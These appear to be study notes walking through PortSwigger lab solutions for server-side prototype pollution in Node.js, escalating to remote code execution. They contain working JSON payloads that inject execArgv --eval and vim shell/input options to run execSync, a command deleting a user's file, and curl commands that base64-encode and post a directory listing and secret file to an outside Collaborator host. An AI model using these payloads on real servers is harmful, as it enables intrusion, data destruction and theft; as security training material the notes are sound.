	- By chaining these JavaScript and [command injection](https://portswigger.net/web-security/os-command-injection) sinks:
		- you can potentially escalate prototype pollution 
			- to gain full RCE capability on the server.

#### Remote code execution via server-side prototype pollution
<span style="background:#fff88f">Study the address change feature</span>
1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
3. 1Observe that when you submit the form, the data from the fields is sent to the server as JSON. 
	1. Notice that the server responds with a JSON object that appears to represent your user. 
	2. This has been updated to reflect your new address information.
    
2. Send the request to Burp Repeater

<span style="background:#fff88f">Identify a prototype pollution source</span>
- In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property.
```
"__proto__": {
    "json spaces":10
}
```
1. Send the request.
2. In the **Response** panel, switch to the **Raw** tab. 
	1. Notice that the JSON indentation has increased based on the value of your injected property. 
	2. This strongly suggests that you have successfully polluted the prototype.

<span style="background:#fff88f">Probe for remote code execution</span>
1. In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.
    
2. Click the button and observe that this triggers background tasks that clean up the database and filesystem. 
	1. This is a classic example of the kind of functionality that may spawn node child processes.
    
3. Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. 
	1. Use this to call the `execSync()` sink, 
		1. passing in a command that triggers an interaction with the public Burp Collaborator server. 
		2. For example:
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
1. Send the request.
2. In the browser, go to the admin panel and trigger the maintenance jobs again. 
	1. Notice that these have both failed this time.
    
3. In Burp, go to the **Collaborator** tab and poll for interactions. 
	1. Observe that you have received several DNS interactions, confirming the remote code execution

<span style="background:#fff88f">Craft an exploit</span>
- In Repeater, replace the `curl` command with a command for deleting Carlos's file:
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
1. Send the request.
2. Go back to the admin panel and trigger the maintenance jobs again.
3. Carlos's file is deleted and the lab is solved.

### Remote code execution via child_process.execSync()
In the previous example, we injected the `child_process.execSync()` sink ourselves via the `--eval` command line argument.

In some cases, the application may:
- invoke this method of its own accord in order to execute system commands.

Just like `fork()`, the `execSync()` method:
- also accepts options object,
	- which may be pollutable via the prototype chain

Although this doesn't accept an `execArgv` property:
- you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:
	- The `input` option is just a string that:
		- is passed to the child process's `stdin` stream 
		- and executed as a system command by `execSync()`. 
		  
		- As there are other options for providing the command, such as simply passing it as an argument to the function:
			- the `input` property itself may be left undefined.
		  
	- The `shell` option lets developers:
		- declare a specific shell in which they want the command to run. 
		- By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined.

By polluting both of these properties:
- you may be able to override the command that the application's developers intended to execute 
- and instead run a malicious command in a shell of your choosing

Note that there are a few caveats to this:
- The `shell` option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, 
	- which most shells use to let you pass in a command as a string. 
	- However, setting the `-c` flag in Node instead:
		- runs a syntax check on the provided script, 
			- which also prevents it from executing
			  
	- As a result, although there are workarounds for this:
		- it's generally tricky to use Node itself as a shell for your attack.
		  
	- As the `input` property containing your payload is passed via `stdin`:
		- the shell you choose must accept commands from `stdin`.

Although they aren't really intended to be shells:
- the text editors Vim and ex reliably fulfill all of these criteria. 
- If either of these happen to be installed on the server, 
	- this creates a potential vector for RCE:
```
"shell":"vim",
"input":":! <command>\n"
```

#### Exfiltrating sensitive data via server-side prototype pollution
<span style="background:#fff88f">Study the address change feature</span>
1. Log in and visit your account page. Submit the form for updating your billing and delivery address.
2. In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
3. 1Observe that when you submit the form, the data from the fields is sent to the server as JSON. 
	1. Notice that the server responds with a JSON object that appears to represent your user. 
	2. This has been updated to reflect your new address information.
    
2. Send the request to Burp Repeater

<span style="background:#fff88f">Identify a prototype pollution source</span>
- In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property.
```
"__proto__": {
    "json spaces":10
}
```
1. Send the request.
2. In the **Response** panel, switch to the **Raw** tab. 
	1. Notice that the JSON indentation has increased based on the value of your injected property. 
	2. This strongly suggests that you have successfully polluted the prototype.

<span style="background:#fff88f">Probe for remote code execution</span>
1. In the browser, go to the admin panel and observe that there's a button for running maintenance jobs.
    
2. Click the button and observe that this triggers background tasks that clean up the database and filesystem. 
	1. This is a classic example of the kind of functionality that may spawn node child processes.
    
3. Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process. 
	1. Use this to call the `execSync()` sink, 
		1. passing in a command that triggers an interaction with the public Burp Collaborator server. 
		2. For example:
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```
1. Send the request.
2. In the browser, go to the admin panel and trigger the maintenance jobs again. 
	1. Notice that these have both failed this time.
    
3. In Burp, go to the **Collaborator** tab and poll for interactions. 
	1. Observe that you have received several DNS interactions, confirming the remote code execution

<span style="background:#fff88f">Leak the hidden file name</span>
1. In Burp Repeater, modify the payload in your malicious `input` parameter to a command that leaks the contents of Carlos's home directory to the public Burp Collaborator server. 
	1. The following is one approach for doing this:
```
"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
```
1. Send the request.
2. In the browser, go to the admin panel and trigger the maintenance jobs again.
3. Go to the **Collaborator** tab and poll for interactions.
4. Notice that you have received a new HTTP `POST` request with a Base64-encoded body.
5. Decode the contents of the body to reveal the names of two entries: `node_apps` and `secret`.

<span style="background:#fff88f">Exfiltrate the contents of the secret file</span>
1. In Burp Repeater, modify the payload in your malicious input parameter to a command that exfiltrates the contents of the file `/home/carlos/secret` to the public Burp Collaborator server. 
	1. The following is one approach for doing this:
```
"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
```
1. Send the request.
2. In the browser, go to the admin panel and trigger the maintenance jobs again.
3. Go to the **Collaborator** tab and poll for interactions.
4. Notice that you have received a new HTTP `POST` request with a Base64-encoded body.
5. Decode the contents of the body to reveal the secret.
6. In your browser, go to the lab banner and click **Submit solution**. 
7. Submit the decoded secret to solve the lab.

